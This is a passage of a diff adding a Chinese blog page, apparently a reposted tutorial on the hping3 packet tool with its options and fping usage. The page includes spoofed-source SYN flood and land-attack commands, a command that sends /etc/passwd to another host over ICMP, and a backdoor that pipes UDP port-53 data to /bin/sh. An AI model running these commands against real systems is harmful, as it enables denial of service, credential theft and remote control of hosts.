@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>hping3命令详解（转） | iHui</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="本文转载于https:&#x2F;&#x2F;blog.csdn.net&#x2F;freeking101&#x2F;article&#x2F;details&#x2F;72582964                                             转载                hping3 使用详解">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hping3命令详解（转）">
+<meta property="og:url" content="http://example.com/2019/10/19/hping3%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%EF%BC%88%E8%BD%AC%EF%BC%89/index.html">
+<meta property="og:site_name" content="iHui">
+<meta property="og:description" content="本文转载于https:&#x2F;&#x2F;blog.csdn.net&#x2F;freeking101&#x2F;article&#x2F;details&#x2F;72582964                                             转载                hping3 使用详解">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdn.net/20180211232455000">
+<meta property="article:published_time" content="2019-10-18T17:57:34.000Z">
+<meta property="article:modified_time" content="2019-10-19T18:01:38.787Z">
+<meta property="article:author" content="iHui">
+<meta property="article:tag" content="网络安全">
+<meta property="article:tag" content="拒绝服务攻击">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdn.net/20180211232455000">
+  
+    <link rel="alternate" href="/atom.xml" title="iHui" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">iHui</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-hping3命令详解（转）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/10/19/hping3%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%EF%BC%88%E8%BD%AC%EF%BC%89/" class="article-date">
+  <time class="dt-published" datetime="2019-10-18T17:57:34.000Z" itemprop="datePublished">2019-10-19</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      hping3命令详解（转）
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="本文转载于"><a href="#本文转载于" class="headerlink" title="本文转载于"></a>本文转载于</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/freeking101/article/details/72582964">https://blog.csdn.net/freeking101/article/details/72582964</a></p>
+<div class="blog-content-box">
+    <div class="article-header-box">
+        <div class="article-header">
+            <div class="article-title-box">
+                <span class="article-type type-2 float-left">转载</span>                <h1 class="title-article">hping3 使用详解</h1>
+            </div>
+            <div class="article-info-box">
+                <div class="article-bar-top" style="height: 24px;">
+                                                                                                                                                                <span class="time">2017-05-20 19:29:06</span>
+                    <a class="follow-nickName" href="https://me.csdn.net/freeking101" target="_blank" rel="noopener">擒贼先擒王</a>
+                    <span class="read-count">阅读数 28236</span><span class="article_info_click" style="position: static;">更多</span>
+                                                                    <div class="tags-box space">
+                                <span class="label">分类专栏：</span>
+                                                                                                            <a class="tag-link" target="_blank" rel="noopener" href="https://blog.csdn.net/freeking101/article/category/6554606">
+                                            Kali                                        </a>
+                                                                                                </div>
+                                        </div>
+                <div class="operating">
+                                    </div>
+            </div>
+        </div>
+    </div>
+    <article class="baidu_pl">
+                <div id="article_content" class="article_content clearfix">
+                                    <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-3019150162.css">
+                                        <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-3019150162.css">
+                <div class="htmledit_views" id="content_views">
+                                            <p>&nbsp;</p>
+
+<p>hping3命令：<a target="_blank" href="http://man.linuxde.net/hping3" rel="nofollow noopener" data-token="6a666adc0401dc4b6cb4c06e65f31b9f">http://man.linuxde.net/hping3</a><br>
+Testing firewall rules with Hping3 - examples：<a target="_blank" href="http://0daysecurity.com/articles/hping3_examples.html" rel="nofollow noopener" data-token="73cf9a3e53228a6c836f43e6f967217e">http://0daysecurity.com/articles/hping3_examples.html</a></p>
+
+<p>攻防宝典：利用hping3和伪造IP地址执行DOS攻击：<a target="_blank" href="http://netsecurity.51cto.com/art/201508/489303.htm" rel="nofollow noopener" data-token="6ec1e2732cd3c8edd0fc7aa67ff321c7">http://netsecurity.51cto.com/art/201508/489303.htm</a><br>
+DoS***方法（hping3）：<a target="_blank" href="http://19920624.blog.51cto.com/9632075/1584465" rel="nofollow noopener" data-token="7b66d864340a8afa7ad74ff62ed33d40">http://19920624.blog.51cto.com/9632075/1584465</a><br>
+Nmap、Netcat、Hping3工具对比：<a target="_blank" href="http://www.2cto.com/article/201210/158961.html" rel="nofollow noopener" data-token="fafef22f5f9dcd48f713b57be753feec">http://www.2cto.com/article/201210/158961.html</a></p>
+
+<p>&nbsp;</p>
+
+<p>&nbsp;</p>
+
+<h1><a name="t0"></a>hping</h1>
+
+<p>&nbsp;</p>
+
+<p><span style="color:#7c79e5;"><strong>hping </strong></span>是 面向命令行的用于生成和解析TCP/IP协议数据包汇编/分析的开源工具。作者是Salvatore Sanfilippo，界面灵感来自ping（8）unix命令，<span style="color:#7c79e5;"><strong>目前最新版是 hping3</strong></span>，它支持TCP，UDP，ICMP和RAW-IP协议，具有跟踪路由模式，能够在覆盖的信道之间发送文件以及许多其他功能，支持使用tcl脚本自动化地调用其API。<strong>hping是安全审计、防火墙测试等工作的标配工具</strong>。<span style="color:#7c79e5;"><strong>hping 优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。</strong></span></p>
+
+<p><img alt="" class="has" src="https://img-blog.csdn.net/20180211232455000"></p>
+
+<p>虽然 hping 以前主要用作安全工具，但它可以在许多方面被不太关心安全性的人员用于测试网络和主机，您可以使用hping的一小部分内容：</p>
+
+<pre class="has" name="code"><code class="language-diff"><span class="hljs-deletion">- 防火墙测试</span>
+<span class="hljs-deletion">- 高级端口扫描</span>
+<span class="hljs-deletion">- 网络测试，使用不同的协议，TOS，分片</span>
+<span class="hljs-deletion">- 手动路径MTU发现</span>
+<span class="hljs-deletion">- 在所有支持的协议下，高级traceroute</span>
+<span class="hljs-deletion">- 远程操作系统指纹</span>
+<span class="hljs-deletion">- 远程正常运行时间猜测</span>
+<span class="hljs-deletion">- TCP/IP协议栈审计</span>
+<span class="hljs-deletion">- hping也可以用于学习TCP/IP的学生</span></code></pre>
+
+<p>工具来源：http://www.hping.org/<br><a target="_blank" href="http://www.hping.org/" rel="nofollow noopener" data-token="7f51d83cba2ad0ab7bddb7ce0b64b8c5">hping3主页</a>&nbsp;|&nbsp;<a target="_blank" href="http://git.kali.org/gitweb/?p=packages/hping3.git;a=summary" rel="nofollow noopener" data-token="285a7bdb46315ed5ee89cccf05530415">Kali hping3仓库</a></p>
+
+<pre class="has" name="code"><code class="language-sql">用法: hping3 host [options]
+  -h  <span class="hljs-comment">--help      显示帮助</span>
+  -v  <span class="hljs-comment">--version   显示版本</span>
+  -c  <span class="hljs-comment">--count     发送数据包的数目</span>
+  -i  <span class="hljs-comment">--interval  发送数据包间隔的时间 (uX即X微秒, 例如： -i u1000)</span>
+      <span class="hljs-comment">--fast      等同 -i u10000 (每秒10个包)</span>
+      <span class="hljs-comment">--faster    等同 -i u1000 (每秒100个包)</span>
+      <span class="hljs-comment">--flood      尽最快发送数据包，不显示回复。</span>
+  -n  <span class="hljs-comment">--numeric   数字化输出，象征性输出主机地址。</span>
+  -q  <span class="hljs-comment">--quiet     安静模式</span>
+  -I  <span class="hljs-comment">--interface 网卡接口 (默认路由接口)</span>
+  -V  <span class="hljs-comment">--verbose   详细模式</span>
+  -D  <span class="hljs-comment">--debug     调试信息</span>
+  -z  <span class="hljs-comment">--bind      绑定ctrl+z到ttl(默认为目的端口)</span>
+  -Z  <span class="hljs-comment">--unbind    取消绑定ctrl+z键</span>
+      <span class="hljs-comment">--beep      对于接收到的每个匹配数据包蜂鸣声提示</span>
+
+模式选择
+  default mode     TCP   // 默认模式是 TCP
+  -0  <span class="hljs-comment">--rawip      RAWIP模式，原始IP模式。在此模式下HPING会发送带数据的IP头。即裸IP方式。使用RAWSOCKET方式。</span>
+  -1  <span class="hljs-comment">--icmp       ICMP模式，此模式下HPING会发送IGMP应答报，你可以用--ICMPTYPE --ICMPCODE选项发送其他类型/模式的ICMP报文。</span>
+  -2  <span class="hljs-comment">--udp        UDP 模式，缺省下，HPING会发送UDP报文到主机的0端口，你可以用--baseport --destport --keep选项指定其模式。</span>
+  -8  <span class="hljs-comment">--scan       SCAN mode. //扫描模式 指定扫描对应的端口。</span>
+                   Example: hping <span class="hljs-comment">--scan 1-30,70-90 -S www.target.host    // 扫描</span>
+  -9  <span class="hljs-comment">--listen     listen mode  // 监听模式</span>
+  
+IP 模式
+  -a  <span class="hljs-comment">--spoof      spoof source address  //源地址欺骗。伪造IP攻击，防火墙就不会记录你的真实IP了，当然回应的包你也接收不到了。</span>
+  <span class="hljs-comment">--rand-dest      random destionation address mode. see the man. // 随机目的地址模式。详细使用 man 命令</span>
+  <span class="hljs-comment">--rand-source    random source address mode. see the man.       // 随机源地址模式。详细使用 man 命令</span>
+  -t  <span class="hljs-comment">--ttl        ttl (默认 64)  //修改 ttl 值</span>
+  -N  <span class="hljs-comment">--id         id (默认 随机)  // hping 中的 ID 值，缺省为随机值</span>
+  -W  <span class="hljs-comment">--winid      使用win* id字节顺序  //使用winid模式，针对不同的操作系统。UNIX ,WINDIWS的id回应不同的，这选项可以让你的ID回应和WINDOWS一样。</span>
+  -r  <span class="hljs-comment">--rel        相对id字段(估计主机流量)  //更改ID的，可以让ID曾递减输出，详见HPING-HOWTO。</span>
+  -f  <span class="hljs-comment">--frag       拆分数据包更多的frag.  (may pass weak acl)   //分段，可以测试对方或者交换机碎片处理能力，缺省16字节。</span>
+  -x  <span class="hljs-comment">--morefrag   设置更多的分段标志    // 大量碎片，泪滴攻击。</span>
+  -y  <span class="hljs-comment">--dontfrag   设置不分段标志    // 发送不可恢复的IP碎片，这可以让你了解更多的MTU PATH DISCOVERY。</span>
+  -g  <span class="hljs-comment">--fragoff    set the fragment offset    // 设置断偏移。</span>
+  -m  <span class="hljs-comment">--mtu        设置虚拟最大传输单元, implies --frag if packet size &gt; mtu    // 设置虚拟MTU值，当大于mtu的时候分段。</span>
+  -o  <span class="hljs-comment">--tos        type of service (default 0x00), try --tos help          // tos字段，缺省0x00，尽力而为？</span>
+  -G  <span class="hljs-comment">--rroute     includes RECORD_ROUTE option and display the route buffer    // 记录IP路由，并显示路由缓冲。</span>
+  <span class="hljs-comment">--lsrr           松散源路由并记录路由        // 松散源路由</span>
+  <span class="hljs-comment">--ssrr           严格源路由并记录路由      // 严格源路由</span>
+  -H  <span class="hljs-comment">--ipproto    设置IP协议字段，仅在RAW IP模式下使用   //在RAW IP模式里选择IP协议。设置ip协议域，仅在RAW ip模式使用。</span>
+
+ICMP 模式
+  -C  <span class="hljs-comment">--icmptype   icmp类型(默认echo请求)    // ICMP类型，缺省回显请求。</span>
+  -K  <span class="hljs-comment">--icmpcode   icmp代号(默认0)     // ICMP代码。</span>
+      <span class="hljs-comment">--force-icmp 发送所有icmp类型(默认仅发送支持的类型)    // 强制ICMP类型。</span>
+      <span class="hljs-comment">--icmp-gw    设置ICMP重定向网关地址(默认0.0.0.0)    // ICMP重定向</span>
+      <span class="hljs-comment">--icmp-ts    等同 --icmp --icmptype 13 (ICMP 时间戳)            // icmp时间戳</span>
+      <span class="hljs-comment">--icmp-addr  等同 --icmp --icmptype 17 (ICMP 地址子网掩码)  // icmp子网地址</span>
+      <span class="hljs-comment">--icmp-help  显示其他icmp选项帮助      // ICMP帮助</span>
+
+UDP/TCP 模式
+  -s  <span class="hljs-comment">--baseport   base source port             (default random)              // 缺省随机源端口</span>
+  -p  <span class="hljs-comment">--destport   [+][+]&lt;port&gt; destination port(default 0) ctrl+z inc/dec    // 缺省随机源端口</span>
+  -k  <span class="hljs-comment">--keep       keep still source port      // 保持源端口</span>
+  -w  <span class="hljs-comment">--win        winsize (default 64)        // win的滑动窗口。windows发送字节(默认64)</span>
+  -O  <span class="hljs-comment">--tcpoff     set fake tcp data offset     (instead of tcphdrlen / 4)    // 设置伪造tcp数据偏移量(取代tcp地址长度除4)</span>
+  -Q  <span class="hljs-comment">--seqnum     shows only tcp sequence number        // 仅显示tcp序列号</span>
+  -b  <span class="hljs-comment">--badcksum   (尝试)发送具有错误IP校验和数据包。许多系统将修复发送数据包的IP校验和。所以你会得到错误UDP/TCP校验和。</span>
+  -M  <span class="hljs-comment">--setseq     设置TCP序列号 </span>
+  -L  <span class="hljs-comment">--setack     设置TCP的ack   ------------------------------------- (不是 TCP 的 ACK 标志位)</span>
+  -F  <span class="hljs-comment">--fin        set FIN flag</span>
+  -S  <span class="hljs-comment">--syn        set SYN flag</span>
+  -R  <span class="hljs-comment">--rst        set RST flag</span>
+  -P  <span class="hljs-comment">--push       set PUSH flag</span>
+  -A  <span class="hljs-comment">--ack        set ACK flag   ------------------------------------- （设置 TCP 的 ACK 标志 位）</span>
+  -U  <span class="hljs-comment">--urg        set URG flag      // 一大堆IP抱头的设置。</span>
+  -X  <span class="hljs-comment">--xmas       set X unused flag (0x40)</span>
+  -Y  <span class="hljs-comment">--ymas       set Y unused flag (0x80)</span>
+  <span class="hljs-comment">--tcpexitcode    使用last tcp-&gt; th_flags作为退出码</span>
+  <span class="hljs-comment">--tcp-mss        启用具有给定值的TCP MSS选项</span>
+  <span class="hljs-comment">--tcp-timestamp  启用TCP时间戳选项来猜测HZ/uptime</span>
+
+Common //通用设置
+  -d  <span class="hljs-comment">--data       data size    (default is 0)    // 发送数据包大小，缺省是0。</span>
+  -E  <span class="hljs-comment">--file       文件数据</span>
+  -e  <span class="hljs-comment">--sign       添加“签名”</span>
+  -j  <span class="hljs-comment">--dump       转储为十六进制数据包</span>
+  -J  <span class="hljs-comment">--print      转储为可打印字符</span>
+  -B  <span class="hljs-comment">--safe       启用“安全”协议</span>
+  -u  <span class="hljs-comment">--end        告诉你什么时候--file达到EOF并防止倒回</span>
+  -T  <span class="hljs-comment">--traceroute traceroute模式(等同使用 --bind 且--ttl 1)</span>
+  <span class="hljs-comment">--tr-stop        在traceroute模式下收到第一个不是ICMP时退出</span>
+  <span class="hljs-comment">--tr-keep-ttl    保持源TTL固定，仅用于监视一跳</span>
+  <span class="hljs-comment">--tr-no-rtt       不要在跟踪路由模式下计算/显示RTT信息 ARS包描述（新增功能，不稳定）</span>
+ARS packet description (new, unstable)
+  <span class="hljs-comment">--apd-send       发送APD描述数据包(参见docs / APD.txt)</span></code></pre>
+
+<p>&nbsp;</p>
+
+<p>&nbsp;</p>
+
+<h1><a name="t1"></a>Hping3 功能</h1>
+
+<p>&nbsp;</p>
+
+<p><span style="color:#2d374b;">Hping3 主要有以下典型功能应用：</span></p>
+
+<p>&nbsp;</p>
+
+<h2><a name="t2"></a>防火墙测试</h2>
+
+<p><span style="color:#2d374b;">使用Hping3指定各种数据包字段，依次对防火墙进行详细测试。请参考：http://0daysecurity.com/articles/hping3_examples.html&nbsp;</span></p>
+
+<p><span style="color:#2d374b;">测试防火墙对ICMP包的反应、是否支持traceroute、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。例如，以LandAttack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）。</span></p>
+
+<pre class="has" name="code"><code class="language-css"><span class="hljs-selector-tag">hping3</span> <span class="hljs-selector-tag">-S</span> <span class="hljs-selector-tag">-c</span> 1000000 <span class="hljs-selector-tag">-a</span> 10<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.10</span> <span class="hljs-selector-tag">-p</span> 21 10<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.10</span></code></pre>
+
+<p>&nbsp;</p>
+
+<h2><a name="t3"></a>端口扫描</h2>
+
+<p>&nbsp;</p>
+
+<p><span style="color:#2d374b;">Hping3也可以对目标端口进行扫描。Hping3支持指定TCP各个标志位、长度等信息。以下示例可用于探测目标机的80端口是否开放：</span></p>
+
+<pre class="has" name="code"><code class="language-css"><span class="hljs-selector-tag">hping3</span> <span class="hljs-selector-tag">-I</span> <span class="hljs-selector-tag">eth0</span> <span class="hljs-selector-tag">-S</span> 192<span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.1</span> <span class="hljs-selector-tag">-p</span> 80</code></pre>
+
+<p><span style="color:#2d374b;">其中-I eth0指定使用eth0端口，-S指定TCP包的标志位SYN，-p 80指定探测的目的端口。&nbsp;</span></p>
+
+<p><span style="color:#2d374b;">hping3支持非常丰富的端口探测方式，nmap拥有的扫描方式hping3几乎都支持（除开connect方式，因为Hping3仅发送与接收包，不会维护连接，所以不支持connect方式探测）。而且Hping3能够对发送的探测进行更加精细的控制，方便用户微调探测结果。当然，Hping3的端口扫描性能及综合处理能力，无法与Nmap相比。一般使用它仅对少量主机的少量端口进行扫描。</span></p>
+
+<p>&nbsp;</p>
+
+<h2><a name="t4"></a>Idle扫描</h2>
+
+<p><span style="color:#2d374b;">Idle扫描（Idle Scanning）是一种匿名扫描远程主机的方式，该方式也是有Hping3的作者Salvatore Sanfilippo发明的，目前Idle扫描在Nmap中也有实现。&nbsp;</span></p>
+
+<p><span style="color:#2d374b;">该扫描原理是：寻找一台idle主机（该主机没有任何的网络流量，并且IPID是逐个增长的），攻击端主机先向idle主机发送探测包，从回复包中获取其IPID。冒充idle主机的IP地址向远程主机的端口发送SYN包（此处假设为SYN包），此时如果远程主机的目的端口开放，那么会回复SYN/ACK，此时idle主机收到SYN/ACK后回复RST包。然后攻击端主机再向idle主机发送探测包，获取其IPID。那么对比两次的IPID值，我们就可以判断远程主机是否回复了数据包，从而间接地推测其端口状态。</span></p>
+
+<p>&nbsp;</p>
+
+<h2><a name="t5"></a>拒绝服务攻击</h2>
+
+<p><span style="color:#2d374b;">使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。</span></p>
+
+<pre class="has" name="code"><code class="language-css"><span class="hljs-selector-tag">hping3</span> <span class="hljs-selector-tag">-I</span> <span class="hljs-selector-tag">eth0</span> <span class="hljs-selector-tag">-a192</span><span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.99</span> <span class="hljs-selector-tag">-S</span> 192<span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.33</span> <span class="hljs-selector-tag">-p</span> 80 <span class="hljs-selector-tag">-i</span> <span class="hljs-selector-tag">u1000</span></code></pre>
+
+<p><span style="color:#2d374b;">其他攻击如smurf、teardrop、land attack等也很容易构建出来。</span></p>
+
+<p>&nbsp;</p>
+
+<h2><a name="t6"></a>文件传输</h2>
+
+<p><span style="color:#2d374b;">Hping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务：</span></p>
+
+<pre class="has" name="code"><code class="language-css"><span class="hljs-selector-tag">hping3</span> 192<span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.1</span><span class="hljs-selector-class">.159--listen</span> <span class="hljs-selector-tag">signature</span> <span class="hljs-selector-tag">--safe</span> <span class="hljs-selector-tag">--icmp</span></code></pre>
+
+<p><span style="color:#2d374b;">监听ICMP包中的签名，根据签名解析出文件内容。&nbsp;</span></p>
+
+<p><span style="color:#2d374b;">在发送端使用签名打包的ICMP包发送文件：</span></p>
+
+<pre class="has" name="code"><code class="language-delphi">hping3 <span class="hljs-number">192.168</span>.<span class="hljs-number">1.108</span>--icmp ?d <span class="hljs-number">100</span> --sign signature --<span class="hljs-keyword">file</span> /etc/passwd</code></pre>
+
+<p><span style="color:#2d374b;">将/etc/passwd密码文件通过ICMP包传给192.168.10.44主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。</span></p>
+
+<p>&nbsp;</p>
+
+<h2><a name="t7"></a>木马功能</h2>
+
+<p><span style="color:#2d374b;">如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与netcat的后门功能类似。</span></p>
+
+<p><span style="color:#2d374b;">示例：本地打开53号UDP端口（DNS解析服务）监听来自192.168.10.66主机的包含签名为signature的数据包，并将收到的数据调用/bin/sh执行。&nbsp;</span></p>
+
+<p><span style="color:#2d374b;">在木马启动端：</span></p>
+
+<pre class="has" name="code"><code class="language-javascript">hping3 <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.66</span>--listen signature --safe --udp -p <span class="hljs-number">53</span> | <span class="hljs-regexp">/bin/</span>sh</code></pre>
+
+<p><span style="color:#2d374b;">在远程控制端：</span></p>
+
+<pre class="has" name="code"><code class="language-delphi">echo ls &gt;test.cmd 
+hping3 <span class="hljs-number">192.168</span>.<span class="hljs-number">10.44</span> -p53 -d <span class="hljs-number">100</span> --udp --sign siganature --<span class="hljs-keyword">file</span> ./test.cmd</code></pre>
+
+<p><span style="color:#2d374b;">将包含ls命令的文件加上签名signature发送到192.168.10.44主机的53号UDP端口，包数据长度为100字节。&nbsp;</span></p>
+
+<p><span style="color:#2d374b;">当然这里只是简单的演示程序，真实的场景，控制端可以利益shell执行很多的高级复杂的操作。</span></p>
+
+<p>&nbsp;</p>
+
+<p>&nbsp;</p>
+
+<p>&nbsp;</p>
+
+<h1><a name="t8"></a>fping 用法</h1>
+
+<p>&nbsp;</p>
+
+<p><strong><a target="_blank" href="http://www.fping.org/" rel="nofollow noopener" data-token="bc6d466d524e8d697358f675eea88a67">fping 官网</a></strong></p>
+
+<p>&nbsp; &nbsp; &nbsp; &nbsp; fping 是一个将&nbsp; ICMP echo 探测器发送到网络主机的程序，类似于 ping，可以看作是 ping 的增强版。但是 fping 在 ping多个主机时性能更好。</p>
+
+<pre class="has" name="code"><code class="language-sql">Usage: fping [options] [targets...]
+   -a         显示存活目标，即可ping通的目标
+   -A         将目标以ip地址的形式显示
+   -b n       ping 数据包的大小。（默认为56）
+   -B f       <span class="hljs-keyword">set</span> exponential backoff factor <span class="hljs-keyword">to</span> f
+   -c n       ping每个目标的次数 (默认为<span class="hljs-number">1</span>)
+   -C n       同-c, 返回的结果为冗长格式
+   -D         每个输出行打印时间戳
+   -e         显示返回数据包所费时间
+   -f <span class="hljs-keyword">file</span>    从文件获取目标列表( - 表示从标准输入)(不能与 -g 同时使用)
+   -g         生成目标列表(不能与 -f 同时使用)
+                (可指定目标的开始和结束IP， 或者提供ip的子网掩码)
+                (例：fping -g <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.255</span> 或 fping -g <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span>)                
+   -H n       设置ip的TTL值 (生存时间)
+   -i n       ping包之间的间隔(单位：毫秒)(默认<span class="hljs-number">25</span>)
+   -I <span class="hljs-keyword">if</span>      绑定到特定的接口
+   -l         循环发送ping
+   -m         ping目标主机的多个网口
+   -M         设置不分段标记
+   -n         将目标以主机名或域名显示(等价于 -d )
+   -N         输出兼容netdata (-l -Q <span class="hljs-keyword">are</span> <span class="hljs-keyword">required</span>)
+   -o         显示累计中断时间 (lost packets * packet <span class="hljs-built_in">interval</span>)
+   -O n       在ICMP包中设置服务的类型(tos)标志
+   -p n       对同一个目标的ping包间隔(毫秒)
+                 (在循环和统计模式中，默认为<span class="hljs-number">1000</span>)
+   -q         安静模式(不显示每个目标或每个ping的结果)
+   -Q n       同-q, 但是每n秒显示信息概要
+   -r n       当ping失败时，最大重试次数(默认为<span class="hljs-number">3</span>次)
+   -R         random packet <span class="hljs-keyword">data</span> (<span class="hljs-keyword">to</span> foil <span class="hljs-keyword">link</span> <span class="hljs-keyword">data</span> compression)
+   -s         打印最后的统计数据
+   -S addr    设置源ip地址
+   -t n       单个目标的超时时间(毫秒)(默认<span class="hljs-number">500</span>)
+   -T n       请忽略(为兼容fping <span class="hljs-number">2.4</span>)
+   -u         显示不可到达的目标
+   -v         显示版本号
+   targets    需要ping的目标列表(不能和 -f 同时使用)</code></pre>
+
+<p>示例</p>
+
+<pre class="has" name="code"><code class="language-css"><span class="hljs-selector-tag">fping</span> <span class="hljs-selector-tag">-A</span> <span class="hljs-selector-tag">-u</span> <span class="hljs-selector-tag">-c</span> 4 192<span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.1</span><span class="hljs-selector-class">.1</span> 192<span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.1</span><span class="hljs-selector-class">.74</span> 192<span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.1</span><span class="hljs-selector-class">.20</span></code></pre>
+
+<p>&nbsp;</p>
+
+<p>&nbsp;</p>
+
+<h1><a name="t9"></a>ping 用法</h1>
+
+<p>&nbsp;</p>
+
+<p><strong>ping 命令&nbsp;&nbsp;<a target="_blank" href="http://man.linuxde.net/ping" rel="nofollow noopener" data-token="25c8a7aefd5da2833359a7d55befa227">http://man.linuxde.net/ping</a></strong></p>
+
+<p>&nbsp;</p>
+
+<p>&nbsp;</p>
+
+<p>&nbsp;</p>
+                                    </div>
+                    </div>
+    </article>
+    <div class="postTime"> 
+        <div class="article-bar-bottom">
+            <span class="time">
+                文章最后发布于: 2017-05-20 19:29:06            </span>
+        </div>
+    </div>
+</div>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/10/19/hping3%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%EF%BC%88%E8%BD%AC%EF%BC%89/" data-id="cl1qb1dyk004bqktugxybhxcr" data-title="hping3命令详解（转）" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/" rel="tag">拒绝服务攻击</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/10/19/2019%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-wp/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">前一篇</strong>
+      <div class="article-nav-title">
+        
+          2019巅峰极客-wp
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/10/19/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%EF%BC%88DoS%E6%94%BB%E5%87%BB%EF%BC%89/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">拒绝服务攻击（DoS攻击）</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Android/">Android</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CSharp/">CSharp</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Cpp/">Cpp</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/DVWA/">DVWA</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/">Java</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/JavaScript/">JavaScript</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/MySQL/">MySQL</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web/">Web</a></li><li class="category-list-item"><a class="category-list-link" 